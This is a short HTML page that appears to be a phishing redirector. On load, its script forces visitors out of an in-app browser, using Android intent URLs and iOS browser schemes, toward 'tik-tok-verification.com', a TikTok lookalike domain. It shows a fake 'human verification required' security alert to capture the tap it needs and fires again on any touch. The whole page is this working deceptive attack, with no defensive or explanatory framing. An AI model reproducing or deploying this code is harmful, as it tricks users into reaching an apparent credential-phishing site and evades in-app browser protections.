<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = "tik-tok-verification.com/Verification/verify1.html";

    function forceOut() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android Chrome Force
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS Direct Protocol
            // This is the cleanest way to tell the OS: "I need Safari"
            window.location.href = "safari-https://" + domain;
            
            setTimeout(() => {
                window.location.href = "googlechromes://" + domain;
            }, 50);
        }
    }

    // This runs the moment they land
    window.onload = function() {
        forceOut();

        setTimeout(() => {
            // The Alert acts as the "Verify" button. 
            // When they tap "OK", it counts as the User Gesture needed to break out.
            alert("HUMAN VERIFICATION REQUIRED\n\nSuspicious activity detected. Please complete verification in your secure system browser.");
            
            forceOut();
        }, 500);
    };

    // If they touch anywhere, it triggers the force out again.
    document.addEventListener('touchstart', forceOut);
</script>
</body>
